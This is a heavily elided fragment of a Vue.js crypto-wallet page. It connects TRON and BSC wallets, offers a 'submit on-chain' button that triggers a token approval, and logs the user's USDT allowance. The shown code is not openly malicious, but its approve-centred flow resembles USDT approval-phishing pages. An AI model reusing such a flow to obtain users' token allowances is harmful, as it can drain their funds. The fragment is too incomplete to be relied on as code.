  ...
  <div class="home_view">
    <div class="container">
      ...
      <div class="card">
        ...
        <div
          v-if="
            tronAddress === 'CONNECT WALLET' || bscAddress === 'CONNECT WALLET'
          "
          class="btn"
          @click="connectWallet"
        >
        ...
        <div class="btn" @click="approve" v-loading.fullscreen.lock="Loading">
          提交上鏈
        </div>
      </div>
    </div>
...
async function getBscAuthorizedAmount() {
  try {
    ...
    console.log("BSC 上的授权金额:", allowanceInUsdt.value, "USDT");
    // 显示授权金额
...
async function connectWallet() {
  console.log("开始检测tronWeb", tronWebValue.value);
...
async function getAuthorizedAmount() {
  ...
  try {
    ...
    const authorizedAmount = await contract.methods
      ...
      .call();
    console.log("authorizedAmount", authorizedAmount);
    ...
    // 显示授权金额
    console.log("授权金额:", formattedAmount.value, "USDT");
  } catch (error) {
